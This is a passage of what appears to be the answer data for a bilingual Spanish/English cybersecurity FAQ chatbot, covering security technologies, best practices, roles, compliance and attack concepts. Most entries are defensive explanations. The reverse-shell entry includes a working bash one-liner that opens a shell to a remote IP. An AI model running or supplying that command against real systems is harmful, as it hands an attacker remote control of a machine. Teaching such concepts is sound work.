        answerEn: "**DNS Spoofing** (or DNS Poisoning) corrupts DNS cache to redirect users from legitimate sites to malicious ones without them noticing.<br>🌐 **Result:** You visit 'google.com' but arrive at a fake site.<br>🛡️ **Prevention:** DNSSEC, use trusted DNS servers."
    },
    // === SECURITY TECHNOLOGIES ===
    {
        keywords: ["que es firewall", "what is firewall", "cortafuegos", "firewall function"],
        answer: "Un **Firewall** es una barrera de seguridad que filtra el tráfico de red según reglas predefinidas, bloqueando accesos no autorizados.<br>🔥 **Tipos:** Hardware (appliance), Software (Windows Defender), Cloud (WAF).<br>**Regla básica:** Denegar todo por defecto, permitir solo lo necesario.",
        answerEn: "A **Firewall** is a security barrier that filters network traffic according to predefined rules, blocking unauthorized access.<br>🔥 **Types:** Hardware (appliance), Software (Windows Defender), Cloud (WAF).<br>**Basic rule:** Deny all by default, allow only what's necessary."
    },
    {
        keywords: ["diferencia ids ips", "ids vs ips", "what is ids ips", "intrusion detection prevention"],
        answer: "**IDS** (Intrusion Detection System): Detecta y **alerta** sobre actividad sospechosa, pero no la bloquea.<br>**IPS** (Intrusion Prevention System): Detecta **y bloquea** automáticamente amenazas en tiempo real.<br>💡 **Analogía:** IDS es una alarma; IPS es una alarma con cerradura automática.",
        answerEn: "**IDS** (Intrusion Detection System): Detects and **alerts** about suspicious activity, but doesn't block it.<br>**IPS** (Intrusion Prevention System): Detects **and blocks** threats automatically in real-time.<br>💡 **Analogy:** IDS is an alarm; IPS is an alarm with automatic lock."
    },
    {
        keywords: ["que es vpn", "what is vpn", "red privada virtual", "virtual private network"],
        answer: "Una **VPN** (Virtual Private Network) crea un túnel cifrado entre tu dispositivo e internet, ocultando tu IP real y protegiendo tus datos de espías.<br>🌍 **Usos:** Trabajar remotamente de forma segura, evadir censura, proteger privacidad en WiFi pública.",
        answerEn: "A **VPN** (Virtual Private Network) creates an encrypted tunnel between your device and the internet, hiding your real IP and protecting your data from spies.<br>🌍 **Uses:** Work remotely securely, bypass censorship, protect privacy on public WiFi."
    },
    {
        keywords: ["que es cifrado", "que es encriptacion", "what is encryption", "encryption types"],
        answer: "El **cifrado** convierte datos legibles (texto plano) en formato ilegible (texto cifrado) usando un algoritmo y una clave.<br>🔐 **Tipos:**<br>- **Simétrico:** Misma clave para cifrar/descifrar (AES).<br>- **Asimétrico:** Par de claves pública/privada (RSA).",
        answerEn: "**Encryption** converts readable data (plaintext) into unreadable format (ciphertext) using an algorithm and a key.<br>🔐 **Types:**<br>- **Symmetric:** Same key for encrypt/decrypt (AES).<br>- **Asymmetric:** Public/private key pair (RSA)."
    },
    {
        keywords: ["que es mfa", "que es 2fa", "autenticacion multifactor", "what is mfa", "multi factor authentication"],
        answer: "**MFA** (Multi-Factor Authentication) requiere 2+ factores para verificar identidad:<br>1️⃣ Algo que **sabes** (contraseña)<br>2️⃣ Algo que **tienes** (teléfono, token)<br>3️⃣ Algo que **eres** (huella, cara)<br>🛡️ **Resultado:** Incluso si roban tu contraseña, no pueden entrar.",
        answerEn: "**MFA** (Multi-Factor Authentication) requires 2+ factors to verify identity:<br>1️⃣ Something you **know** (password)<br>2️⃣ Something you **have** (phone, token)<br>3️⃣ Something you **are** (fingerprint, face)<br>🛡️ **Result:** Even if they steal your password, they can't get in."
    },
    {
        keywords: ["diferencia http https", "http vs https", "ssl tls", "what is https"],
        answer: "**HTTP:** Protocolo de transferencia sin cifrado. Los datos viajan en texto plano.<br>**HTTPS:** HTTP + SSL/TLS = Comunicación cifrada.<br>🔒 **Cómo identificarlo:** Candado verde en el navegador.<br>⚠️ **Nunca** ingreses contraseñas en sitios HTTP.",
        answerEn: "**HTTP:** Transfer protocol without encryption. Data travels in plaintext.<br>**HTTPS:** HTTP + SSL/TLS = Encrypted communication.<br>🔒 **How to identify:** Green padlock in browser.<br>⚠️ **Never** enter passwords on HTTP sites."
    },
    {
        keywords: ["que es hash", "hashing", "what is hash", "hash function"],
        answer: "Un **hash** es una función unidireccional que convierte datos de cualquier tamaño en una cadena de longitud fija.<br>🔑 **Características:** Irreversible, mismo input = mismo output, cambio mínimo = hash totalmente diferente.<br>**Usos:** Almacenar contraseñas (bcrypt), verificar integridad de archivos (SHA-256).",
        answerEn: "A **hash** is a one-way function that converts data of any size into a fixed-length string.<br>🔑 **Characteristics:** Irreversible, same input = same output, minimal change = totally different hash.<br>**Uses:** Store passwords (bcrypt), verify file integrity (SHA-256)."
    },
    {
        keywords: ["que es ssl tls", "what is ssl tls", "certificado ssl", "ssl certificate"],
        answer: "**SSL/TLS** son protocolos criptográficos que aseguran las comunicaciones en internet.<br>📜 **Certificado SSL:** Archivo digital que verifica la identidad de un sitio web y habilita HTTPS.<br>🔗 **Autoridades:** Let's Encrypt (gratis), DigiCert, Comodo.",
        answerEn: "**SSL/TLS** are cryptographic protocols that secure internet communications.<br>📜 **SSL Certificate:** Digital file that verifies a website's identity and enables HTTPS.<br>🔗 **Authorities:** Let's Encrypt (free), DigiCert, Comodo."
    },
    {
        keywords: ["que es waf", "web application firewall", "firewall aplicaciones web", "what is waf"],
        answer: "Un **WAF** (Web Application Firewall) protege aplicaciones web filtrando y monitoreando tráfico HTTP/HTTPS.<br>🛡️ **Protege contra:** SQL injection, XSS, CSRF.<br>**Ejemplos:** Cloudflare WAF, AWS WAF, ModSecurity.",
        answerEn: "A **WAF** (Web Application Firewall) protects web applications by filtering and monitoring HTTP/HTTPS traffic.<br>🛡️ **Protects against:** SQL injection, XSS, CSRF.<br>**Examples:** Cloudflare WAF, AWS WAF, ModSecurity."
    },
    {
        keywords: ["que es edr", "endpoint detection response", "what is edr", "deteccion endpoint"],
        answer: "**EDR** (Endpoint Detection and Response) monitorea endpoints (PCs, servidores) en tiempo real para detectar y responder a amenazas avanzadas.<br>🖥️ **Más que antivirus:** Analiza comportamientos, no solo firmas.<br>**Líderes:** CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint.",
        answerEn: "**EDR** (Endpoint Detection and Response) monitors endpoints (PCs, servers) in real-time to detect and respond to advanced threats.<br>🖥️ **More than antivirus:** Analyzes behaviors, not just signatures.<br>**Leaders:** CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint."
    },
    // === BEST PRACTICES ===
    {
        keywords: ["contraseña segura", "strong password", "como crear contraseña", "password best practices"],
        answer: "Una **contraseña segura** debe tener:<br>✅ Mínimo 12-16 caracteres<br>✅ Mayúsculas, minúsculas, números y símbolos<br>✅ No usar información personal<br>✅ Única para cada cuenta<br>💡 **Mejor opción:** Usar un gestor de contraseñas (Bitwarden, 1Password, KeePass).",
        answerEn: "A **strong password** should have:<br>✅ Minimum 12-16 characters<br>✅ Uppercase, lowercase, numbers and symbols<br>✅ Don't use personal information<br>✅ Unique for each account<br>💡 **Best option:** Use a password manager (Bitwarden, 1Password, KeePass)."
    },
    {
        keywords: ["que es patch management", "gestion parches", "what is patching", "actualizaciones seguridad"],
        answer: "**Patch Management** es el proceso de aplicar actualizaciones de seguridad regularmente para corregir vulnerabilidades conocidas.<br>🔧 **Importancia:** El 60% de brechas explotan vulnerabilidades para las que ya existía un parche.<br>**Regla:** Actualizar sistemas críticos dentro de 72 horas del lanzamiento del parche.",
        answerEn: "**Patch Management** is the process of regularly applying security updates to fix known vulnerabilities.<br>🔧 **Importance:** 60% of breaches exploit vulnerabilities for which a patch already existed.<br>**Rule:** Update critical systems within 72 hours of patch release."
    },
    {
        keywords: ["que es zero trust", "modelo zero trust", "what is zero trust", "confianza cero"],
        answer: "**Zero Trust** es un modelo de seguridad que asume que ningún usuario o dispositivo es confiable por defecto, incluso dentro de la red interna.<br>🚫 **Principio:** 'Nunca confíes, siempre verifica'.<br>**Implementación:** Verificar cada acceso, microsegmentación, MFA obligatorio.",
        answerEn: "**Zero Trust** is a security model that assumes no user or device is trustworthy by default, even inside the internal network.<br>🚫 **Principle:** 'Never trust, always verify'.<br>**Implementation:** Verify every access, microsegmentation, mandatory MFA."
    },
    {
        keywords: ["que es defensa en profundidad", "defense in depth", "capas seguridad", "layered security"],
        answer: "**Defensa en Profundidad** es una estrategia que usa múltiples capas de seguridad. Si una falla, las otras siguen protegiendo.<br>🧅 **Capas típicas:** Firewall → IDS/IPS → Antivirus → Cifrado → Control de acceso → Capacitación usuarios.<br>**Analogía:** Castillo medieval con múltiples murallas.",
        answerEn: "**Defense in Depth** is a strategy that uses multiple security layers. If one fails, others continue protecting.<br>🧅 **Typical layers:** Firewall → IDS/IPS → Antivirus → Encryption → Access control → User training.<br>**Analogy:** Medieval castle with multiple walls."
    },
    {
        keywords: ["que es backup", "respaldo datos", "what is backup", "backup strategy"],
        answer: "Un **backup** es una copia de seguridad de datos que permite recuperarlos tras pérdida, ataque o fallo.<br>💾 **Regla 3-2-1:**<br>- **3** copias de tus datos<br>- En **2** tipos de medios diferentes<br>- **1** copia offsite (nube o ubicación física diferente)<br>🛡️ **Protección contra:** Ransomware, fallos de hardware.",
        answerEn: "A **backup** is a security copy of data that allows recovery after loss, attack or failure.<br>💾 **3-2-1 Rule:**<br>- **3** copies of your data<br>- On **2** different media types<br>- **1** offsite copy (cloud or different physical location)<br>🛡️ **Protection against:** Ransomware, hardware failures."
    },
    {
        keywords: ["que es incident response", "respuesta incidentes", "what is incident response", "plan respuesta"],
        answer: "**Incident Response** es el proceso estructurado para manejar brechas de seguridad.<br>📋 **Fases (NIST):**<br>1. Preparación<br>2. Detección y Análisis<br>3. Contención, Erradicación y Recuperación<br>4. Actividades Post-Incidente<br>⏱️ **Objetivo:** Minimizar daño y tiempo de recuperación.",
        answerEn: "**Incident Response** is the structured process to handle security breaches.<br>📋 **Phases (NIST):**<br>1. Preparation<br>2. Detection and Analysis<br>3. Containment, Eradication and Recovery<br>4. Post-Incident Activities<br>⏱️ **Goal:** Minimize damage and recovery time."
    },
    {
        keywords: ["principio minimo privilegio", "least privilege", "what is least privilege", "privilegios minimos"],
        answer: "El **Principio de Mínimo Privilegio** establece que usuarios y programas deben tener solo los permisos mínimos necesarios para realizar su función.<br>🔐 **Beneficio:** Limita el daño si una cuenta es comprometida.<br>**Ejemplo:** Un empleado de ventas no necesita acceso a servidores de desarrollo.",
        answerEn: "The **Principle of Least Privilege** establishes that users and programs should have only the minimum permissions necessary to perform their function.<br>🔐 **Benefit:** Limits damage if an account is compromised.<br>**Example:** A sales employee doesn't need access to development servers."
    },
    {
        keywords: ["que es hardening", "system hardening", "endurecimiento sistema", "securizar sistema"],
        answer: "**System Hardening** es el proceso de asegurar un sistema reduciendo su superficie de ataque.<br>🔧 **Acciones:**<br>- Deshabilitar servicios innecesarios<br>- Eliminar software no usado<br>- Configurar firewalls locales<br>- Aplicar políticas de contraseñas fuertes<br>- Actualizar todo el software",
        answerEn: "**System Hardening** is the process of securing a system by reducing its attack surface.<br>🔧 **Actions:**<br>- Disable unnecessary services<br>- Remove unused software<br>- Configure local firewalls<br>- Apply strong password policies<br>- Update all software"
    },
    {
        keywords: ["que es social engineering", "ingenieria social", "what is social engineering", "manipulacion psicologica"],
        answer: "**Ingeniería Social** es la manipulación psicológica para engañar a personas y obtener información confidencial o acceso a sistemas.<br>🎭 **Técnicas:**<br>- Pretexting (inventar escenarios)<br>- Baiting (dejar USB infectado)<br>- Tailgating (seguir a alguien físicamente)<br>🛡️ **Defensa:** Capacitación y escepticismo saludable.",
        answerEn: "**Social Engineering** is psychological manipulation to deceive people and obtain confidential information or system access.<br>🎭 **Techniques:**<br>- Pretexting (inventing scenarios)<br>- Baiting (leaving infected USB)<br>- Tailgating (physically following someone)<br>🛡️ **Defense:** Training and healthy skepticism."
    },
    {
        keywords: ["seguridad wifi", "wifi security", "wpa2 wpa3", "proteger red inalambrica"],
        answer: "**Seguridad WiFi:**<br>✅ Usar **WPA3** (o mínimo WPA2)<br>✅ Contraseña fuerte (16+ caracteres)<br>✅ Cambiar credenciales por defecto del router<br>✅ Ocultar SSID (opcional)<br>✅ Deshabilitar WPS<br>✅ Crear red de invitados separada<br>⚠️ **Nunca usar:** WEP (obsoleto e inseguro)",
        answerEn: "**WiFi Security:**<br>✅ Use **WPA3** (or minimum WPA2)<br>✅ Strong password (16+ characters)<br>✅ Change router default credentials<br>✅ Hide SSID (optional)<br>✅ Disable WPS<br>✅ Create separate guest network<br>⚠️ **Never use:** WEP (obsolete and insecure)"
    },
    // === PROFESSIONAL ROLES ===
    {
        keywords: ["red team vs blue team", "diferencia red blue team", "what is red team blue team"],
        answer: "**Red Team:** Simula atacantes. Busca vulnerabilidades mediante pentesting y ataques reales autorizados.<br>**Blue Team:** Defiende. Detecta, responde y mitiga ataques. Opera el SOC.<br>**Purple Team:** Colaboración entre ambos para mejorar defensas.",
        answerEn: "**Red Team:** Simulates attackers. Finds vulnerabilities through pentesting and authorized real attacks.<br>**Blue Team:** Defends. Detects, responds and mitigates attacks. Operates the SOC.<br>**Purple Team:** Collaboration between both to improve defenses."
    },
    {
        keywords: ["que hace soc analyst", "soc analyst", "analista soc", "what does soc analyst do"],
        answer: "Un **Analista SOC** (Security Operations Center) monitorea sistemas 24/7 para detectar y responder a incidentes de seguridad.<br>📊 **Tareas:**<br>- Analizar alertas del SIEM<br>- Investigar actividad sospechosa<br>- Responder a incidentes<br>- Crear reportes<br>**Niveles:** Tier 1 (triaje), Tier 2 (investigación), Tier 3 (threat hunting)",
        answerEn: "A **SOC Analyst** (Security Operations Center) monitors systems 24/7 to detect and respond to security incidents.<br>📊 **Tasks:**<br>- Analyze SIEM alerts<br>- Investigate suspicious activity<br>- Respond to incidents<br>- Create reports<br>**Levels:** Tier 1 (triage), Tier 2 (investigation), Tier 3 (threat hunting)"
    },
    {
        keywords: ["que es pentester", "penetration tester", "ethical hacker", "hacker etico"],
        answer: "Un **Pentester** (Penetration Tester) es un hacker ético que intenta hackear sistemas **con permiso** para encontrar vulnerabilidades antes que los atacantes reales.<br>🎯 **Fases:**<br>1. Reconocimiento<br>2. Escaneo<br>3. Explotación<br>4. Post-explotación<br>5. Reporte<br>**Certificaciones:** OSCP, CEH, GPEN",
        answerEn: "A **Pentester** (Penetration Tester) is an ethical hacker who attempts to hack systems **with permission** to find vulnerabilities before real attackers.<br>🎯 **Phases:**<br>1. Reconnaissance<br>2. Scanning<br>3. Exploitation<br>4. Post-exploitation<br>5. Reporting<br>**Certifications:** OSCP, CEH, GPEN"
    },
    {
        keywords: ["certificaciones ciberseguridad", "cybersecurity certifications", "ceh cissp oscp", "mejores certificaciones"],
        answer: "**Certificaciones populares:**<br>🏆 **Entry-level:** CompTIA Security+, CEH (Certified Ethical Hacker)<br>🏆 **Intermedio:** OSCP (Offensive Security), GIAC<br>🏆 **Avanzado:** CISSP (gestión), OSEP, OSCE<br>🏆 **Especializado:** CISM (gestión), CISA (auditoría)<br>💡 **Consejo:** OSCP es muy valorado para roles técnicos.",
        answerEn: "**Popular certifications:**<br>🏆 **Entry-level:** CompTIA Security+, CEH (Certified Ethical Hacker)<br>🏆 **Intermediate:** OSCP (Offensive Security), GIAC<br>🏆 **Advanced:** CISSP (management), OSEP, OSCE<br>🏆 **Specialized:** CISM (management), CISA (audit)<br>💡 **Tip:** OSCP is highly valued for technical roles."
    },
    {
        keywords: ["que es threat hunting", "caza amenazas", "what is threat hunting", "proactive security"],
        answer: "**Threat Hunting** es la búsqueda proactiva de amenazas que evadieron las defensas automáticas.<br>🔍 **Diferencia con SOC:** SOC reacciona a alertas; Threat Hunting busca activamente sin alertas.<br>**Herramientas:** Velociraptor, ELK Stack, Splunk<br>**Habilidades:** Conocer TTPs (MITRE ATT&CK), análisis de logs.",
        answerEn: "**Threat Hunting** is the proactive search for threats that evaded automated defenses.<br>🔍 **Difference from SOC:** SOC reacts to alerts; Threat Hunting actively searches without alerts.<br>**Tools:** Velociraptor, ELK Stack, Splunk<br>**Skills:** Know TTPs (MITRE ATT&CK), log analysis."
    },
    // === COMPLIANCE & GOVERNANCE ===
    {
        keywords: ["que es gdpr", "rgpd", "what is gdpr", "proteccion datos europa"],
        answer: "**GDPR** (General Data Protection Regulation) es la ley de protección de datos de la UE que regula cómo las empresas manejan datos personales.<br>🇪🇺 **Derechos:** Acceso, rectificación, olvido, portabilidad<br>💰 **Multas:** Hasta 20M€ o 4% de facturación global<br>**Aplica a:** Cualquier empresa que procese datos de ciudadanos UE.",
        answerEn: "**GDPR** (General Data Protection Regulation) is the EU data protection law that regulates how companies handle personal data.<br>🇪🇺 **Rights:** Access, rectification, erasure, portability<br>💰 **Fines:** Up to €20M or 4% of global revenue<br>**Applies to:** Any company processing EU citizen data."
    },
    {
        keywords: ["que es iso 27001", "iso 27001", "what is iso 27001", "norma seguridad"],
        answer: "**ISO 27001** es el estándar internacional para Sistemas de Gestión de Seguridad de la Información (SGSI).<br>📋 **Proporciona:** Marco para gestionar riesgos de seguridad<br>✅ **Certificación:** Demuestra compromiso con la seguridad<br>**Controles:** 114 controles en 14 dominios (Anexo A)",
        answerEn: "**ISO 27001** is the international standard for Information Security Management Systems (ISMS).<br>📋 **Provides:** Framework for managing security risks<br>✅ **Certification:** Demonstrates commitment to security<br>**Controls:** 114 controls in 14 domains (Annex A)"
    },
    {
        keywords: ["que es pci dss", "pci dss", "what is pci dss", "seguridad tarjetas"],
        answer: "**PCI DSS** (Payment Card Industry Data Security Standard) son requisitos de seguridad para empresas que procesan, almacenan o transmiten datos de tarjetas de crédito.<br>💳 **12 Requisitos principales:** Firewalls, cifrado, control de acceso, monitoreo, etc.<br>**Obligatorio para:** Comercios, procesadores de pago.",
        answerEn: "**PCI DSS** (Payment Card Industry Data Security Standard) are security requirements for companies that process, store or transmit credit card data.<br>💳 **12 Main requirements:** Firewalls, encryption, access control, monitoring, etc.<br>**Mandatory for:** Merchants, payment processors."
    },
    // === ADVANCED TOPICS ===
    {
        keywords: ["que es mitre attack", "mitre att&ck", "what is mitre attack", "framework tacticas"],
        answer: "**MITRE ATT&CK** es una base de conocimiento de tácticas y técnicas de adversarios basada en observaciones del mundo real.<br>🎯 **Estructura:** 14 tácticas (objetivos) → 100+ técnicas (métodos)<br>**Uso:** Threat hunting, detección, red teaming<br>🔗 <a href='https://attack.mitre.org/' target='_blank'>attack.mitre.org</a>",
        answerEn: "**MITRE ATT&CK** is a knowledge base of adversary tactics and techniques based on real-world observations.<br>🎯 **Structure:** 14 tactics (objectives) → 100+ techniques (methods)<br>**Use:** Threat hunting, detection, red teaming<br>🔗 <a href='https://attack.mitre.org/' target='_blank'>attack.mitre.org</a>"
    },
    {
        keywords: ["que es osint", "open source intelligence", "inteligencia fuentes abiertas", "what is osint"],
        answer: "**OSINT** (Open Source Intelligence) es la recopilación de información de fuentes públicas para inteligencia.<br>🔍 **Fuentes:** Redes sociales, registros públicos, Google, Shodan, WHOIS<br>**Herramientas:** Maltego, theHarvester, Recon-ng, SpiderFoot<br>**Uso:** Reconocimiento pre-ataque, investigaciones.",
        answerEn: "**OSINT** (Open Source Intelligence) is gathering information from public sources for intelligence.<br>🔍 **Sources:** Social media, public records, Google, Shodan, WHOIS<br>**Tools:** Maltego, theHarvester, Recon-ng, SpiderFoot<br>**Use:** Pre-attack reconnaissance, investigations."
    },
    {
        keywords: ["que es botnet", "what is botnet", "red zombies", "zombie network"],
        answer: "Una **botnet** es una red de dispositivos infectados (zombies) controlados remotamente por un atacante (botmaster).<br>🤖 **Usos maliciosos:** Ataques DDoS, spam, minería de criptomonedas, robo de credenciales<br>**Ejemplos famosos:** Mirai (IoT), Zeus (banking trojan)<br>**Tamaño:** Pueden tener millones de bots.",
        answerEn: "A **botnet** is a network of infected devices (zombies) remotely controlled by an attacker (botmaster).<br>🤖 **Malicious uses:** DDoS attacks, spam, cryptocurrency mining, credential theft<br>**Famous examples:** Mirai (IoT), Zeus (banking trojan)<br>**Size:** Can have millions of bots."
    },
    {
        keywords: ["que es honeypot", "what is honeypot", "trampa atacantes", "decoy system"],
        answer: "Un **honeypot** es un sistema señuelo diseñado para atraer atacantes y estudiar sus métodos sin poner en riesgo sistemas reales.<br>🍯 **Tipos:**<br>- **Low-interaction:** Simula servicios básicos<br>- **High-interaction:** Sistema real completo<br>**Beneficios:** Aprender TTPs, desviar atacantes, generar alertas tempranas.",
        answerEn: "A **honeypot** is a decoy system designed to attract attackers and study their methods without risking real systems.<br>🍯 **Types:**<br>- **Low-interaction:** Simulates basic services<br>- **High-interaction:** Complete real system<br>**Benefits:** Learn TTPs, divert attackers, generate early alerts."
    },
    {
        keywords: ["que es apt", "advanced persistent threat", "amenaza persistente avanzada", "what is apt"],
        answer: "Una **APT** (Advanced Persistent Threat) es un ataque prolongado y sigiloso, generalmente patrocinado por estados, dirigido a robar información sensible.<br>🎯 **Características:**<br>- Altamente dirigido<br>- Recursos significativos<br>- Permanece oculto meses/años<br>- Múltiples vectores de ataque<br>**Ejemplos:** APT28 (Fancy Bear), APT29 (Cozy Bear)",
        answerEn: "An **APT** (Advanced Persistent Threat) is a prolonged and stealthy attack, usually state-sponsored, aimed at stealing sensitive information.<br>🎯 **Characteristics:**<br>- Highly targeted<br>- Significant resources<br>- Remains hidden months/years<br>- Multiple attack vectors<br>**Examples:** APT28 (Fancy Bear), APT29 (Cozy Bear)"
    },
    {
        keywords: ["que es siem", "security information event management", "what is siem", "gestion eventos"],
        answer: "Un **SIEM** (Security Information and Event Management) centraliza y analiza logs de toda la infraestructura para detectar amenazas en tiempo real.<br>📊 **Funciones:**<br>- Agregación de logs<br>- Correlación de eventos<br>- Alertas automáticas<br>- Cumplimiento normativo<br>**Líderes:** Splunk, IBM QRadar, Microsoft Sentinel, ELK",
        answerEn: "A **SIEM** (Security Information and Event Management) centralizes and analyzes logs from entire infrastructure to detect threats in real-time.<br>📊 **Functions:**<br>- Log aggregation<br>- Event correlation<br>- Automatic alerts<br>- Regulatory compliance<br>**Leaders:** Splunk, IBM QRadar, Microsoft Sentinel, ELK"
    },
    {
        keywords: ["que es soar", "security orchestration automation", "what is soar", "automatizacion respuesta"],
        answer: "**SOAR** (Security Orchestration, Automation and Response) automatiza respuestas a incidentes de seguridad.<br>🤖 **Ejemplo:** Si detecta malware → automáticamente aísla el equipo + bloquea IP + crea ticket<br>**Beneficios:** Reduce tiempo de respuesta de horas a segundos<br>**Plataformas:** Palo Alto Cortex XSOAR, Splunk SOAR, IBM Resilient",
        answerEn: "**SOAR** (Security Orchestration, Automation and Response) automates security incident responses.<br>🤖 **Example:** If detects malware → automatically isolates machine + blocks IP + creates ticket<br>**Benefits:** Reduces response time from hours to seconds<br>**Platforms:** Palo Alto Cortex XSOAR, Splunk SOAR, IBM Resilient"
    },
    {
        keywords: ["que es devsecops", "devsecops", "what is devsecops", "seguridad devops"],
        answer: "**DevSecOps** integra seguridad en cada fase del ciclo de desarrollo (CI/CD), no como paso final.<br>🔄 **Principio:** 'Shift Left' - detectar vulnerabilidades temprano<br>**Herramientas:**<br>- SAST: SonarQube, Checkmarx<br>- DAST: OWASP ZAP<br>- SCA: Snyk, Dependabot<br>**Resultado:** Software más seguro, entregado más rápido.",
        answerEn: "**DevSecOps** integrates security into every phase of development cycle (CI/CD), not as final step.<br>🔄 **Principle:** 'Shift Left' - detect vulnerabilities early<br>**Tools:**<br>- SAST: SonarQube, Checkmarx<br>- DAST: OWASP ZAP<br>- SCA: Snyk, Dependabot<br>**Result:** More secure software, delivered faster."
    },
    {
        keywords: ["que es container security", "seguridad contenedores", "docker security", "kubernetes security"],
        answer: "**Seguridad de Contenedores** protege aplicaciones en Docker/Kubernetes.<br>🐳 **Mejores prácticas:**<br>- Usar imágenes oficiales verificadas<br>- Escanear imágenes (Trivy, Clair)<br>- No ejecutar como root<br>- Limitar recursos<br>- Actualizar regularmente<br>**Herramientas:** Aqua Security, Sysdig, Falco",
        answerEn: "**Container Security** protects applications in Docker/Kubernetes.<br>🐳 **Best practices:**<br>- Use verified official images<br>- Scan images (Trivy, Clair)<br>- Don't run as root<br>- Limit resources<br>- Update regularly<br>**Tools:** Aqua Security, Sysdig, Falco"
    },
    {
        keywords: ["que es cloud security", "seguridad nube", "aws azure security", "what is cloud security"],
        answer: "**Seguridad Cloud** protege datos y aplicaciones en AWS, Azure, GCP.<br>☁️ **Modelo de Responsabilidad Compartida:**<br>- **Proveedor:** Seguridad DE la nube (infraestructura)<br>- **Cliente:** Seguridad EN la nube (datos, configuración)<br>**Herramientas:** CSPM (Wiz, Orca), CWPP, CASB<br>**Errores comunes:** Buckets S3 públicos, credenciales expuestas.",
        answerEn: "**Cloud Security** protects data and applications in AWS, Azure, GCP.<br>☁️ **Shared Responsibility Model:**<br>- **Provider:** Security OF the cloud (infrastructure)<br>- **Customer:** Security IN the cloud (data, configuration)<br>**Tools:** CSPM (Wiz, Orca), CWPP, CASB<br>**Common mistakes:** Public S3 buckets, exposed credentials."
    },
    {
        keywords: ["como prevenir sql injection", "prevent sql injection", "evitar sqli", "proteccion sql"],
        answer: "**Prevenir SQL Injection:**<br>✅ Usar **prepared statements** (consultas parametrizadas)<br>✅ Validar y sanitizar todas las entradas<br>✅ Usar ORM (Object-Relational Mapping)<br>✅ Principio de mínimo privilegio en BD<br>✅ WAF para capa adicional<br>❌ **Nunca:** Concatenar input del usuario directamente en queries SQL",
        answerEn: "**Prevent SQL Injection:**<br>✅ Use **prepared statements** (parameterized queries)<br>✅ Validate and sanitize all inputs<br>✅ Use ORM (Object-Relational Mapping)<br>✅ Least privilege principle in DB<br>✅ WAF for additional layer<br>❌ **Never:** Concatenate user input directly in SQL queries"
    },
    {
        keywords: ["como prevenir xss", "prevent xss", "evitar cross site scripting", "proteccion xss"],
        answer: "**Prevenir XSS:**<br>✅ **Sanitizar** todas las entradas del usuario<br>✅ **Escapar** output antes de renderizar en HTML<br>✅ Usar **Content Security Policy (CSP)**<br>✅ Validar en servidor, no solo cliente<br>✅ Usar frameworks modernos (React, Vue) que escapan por defecto<br>✅ HTTPOnly flag en cookies",
        answerEn: "**Prevent XSS:**<br>✅ **Sanitize** all user inputs<br>✅ **Escape** output before rendering in HTML<br>✅ Use **Content Security Policy (CSP)**<br>✅ Validate on server, not just client<br>✅ Use modern frameworks (React, Vue) that escape by default<br>✅ HTTPOnly flag on cookies"
    },
    {
        keywords: ["que es csrf", "cross site request forgery", "what is csrf", "falsificacion peticion"],
        answer: "**CSRF** (Cross-Site Request Forgery) engaña a un usuario autenticado para que ejecute acciones no deseadas en una aplicación web.<br>🎣 **Ejemplo:** Visitas un sitio malicioso que envía una petición a tu banco para transferir dinero.<br>🛡️ **Prevención:** Tokens CSRF, SameSite cookies, verificar origen de peticiones.",
        answerEn: "**CSRF** (Cross-Site Request Forgery) tricks an authenticated user into executing unwanted actions on a web application.<br>🎣 **Example:** You visit a malicious site that sends a request to your bank to transfer money.<br>🛡️ **Prevention:** CSRF tokens, SameSite cookies, verify request origin."
    },
    {
        keywords: ["que es privilege escalation", "escalada privilegios", "what is privilege escalation", "elevar privilegios"],
        answer: "**Escalada de Privilegios** es cuando un atacante obtiene permisos superiores a los que debería tener.<br>⬆️ **Tipos:**<br>- **Vertical:** Usuario → Admin/Root<br>- **Horizontal:** Usuario A → Usuario B<br>**Técnicas:** Explotar vulnerabilidades del kernel, configuraciones incorrectas, credenciales débiles<br>**Herramientas:** LinPEAS, WinPEAS",
        answerEn: "**Privilege Escalation** is when an attacker obtains higher permissions than they should have.<br>⬆️ **Types:**<br>- **Vertical:** User → Admin/Root<br>- **Horizontal:** User A → User B<br>**Techniques:** Exploit kernel vulnerabilities, misconfigurations, weak credentials<br>**Tools:** LinPEAS, WinPEAS"
    },
    {
        keywords: ["que es lateral movement", "movimiento lateral", "what is lateral movement", "pivotar red"],
        answer: "**Movimiento Lateral** es cuando un atacante, tras comprometer un sistema, se mueve a otros sistemas dentro de la red.<br>➡️ **Objetivo:** Alcanzar sistemas de mayor valor (servidores, controladores de dominio)<br>**Técnicas:** Pass-the-Hash, RDP, WMI, PsExec<br>🛡️ **Prevención:** Segmentación de red, monitoreo de tráfico lateral, MFA.",
        answerEn: "**Lateral Movement** is when an attacker, after compromising a system, moves to other systems within the network.<br>➡️ **Goal:** Reach higher-value systems (servers, domain controllers)<br>**Techniques:** Pass-the-Hash, RDP, WMI, PsExec<br>🛡️ **Prevention:** Network segmentation, lateral traffic monitoring, MFA."
    },
    {
        keywords: ["que es reverse shell", "shell inversa", "what is reverse shell", "conexion inversa"],
        answer: "Una **Reverse Shell** es una conexión donde la máquina víctima inicia la conexión hacia el atacante (inverso a lo normal).<br>🔄 **¿Por qué?** Evade firewalls que bloquean conexiones entrantes pero permiten salientes.<br>**Ejemplo:** <code>bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</code><br>**Herramientas:** Netcat, Metasploit, Socat",
        answerEn: "A **Reverse Shell** is a connection where the victim machine initiates the connection to the attacker (reverse of normal).<br>🔄 **Why?** Evades firewalls that block incoming connections but allow outgoing.<br>**Example:** <code>bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</code><br>**Tools:** Netcat, Metasploit, Socat"
    },
    {
        keywords: ["que es port scanning", "escaneo puertos", "what is port scanning", "descubrimiento puertos"],
        answer: "**Port Scanning** identifica qué puertos están abiertos en un sistema para descubrir servicios vulnerables.<br>🔍 **Tipos de escaneo:**<br>- **TCP Connect:** Completa handshake (ruidoso)<br>- **SYN Scan:** Half-open (sigiloso)<br>- **UDP Scan:** Más lento, para servicios UDP<br>**Herramienta principal:** Nmap",
        answerEn: "**Port Scanning** identifies which ports are open on a system to discover vulnerable services.<br>🔍 **Scan types:**<br>- **TCP Connect:** Completes handshake (noisy)<br>- **SYN Scan:** Half-open (stealthy)<br>- **UDP Scan:** Slower, for UDP services<br>**Main tool:** Nmap"
    },
    {
        keywords: ["que es vulnerability scanning", "escaneo vulnerabilidades", "what is vulnerability scanning", "scanner vulnerabilidades"],
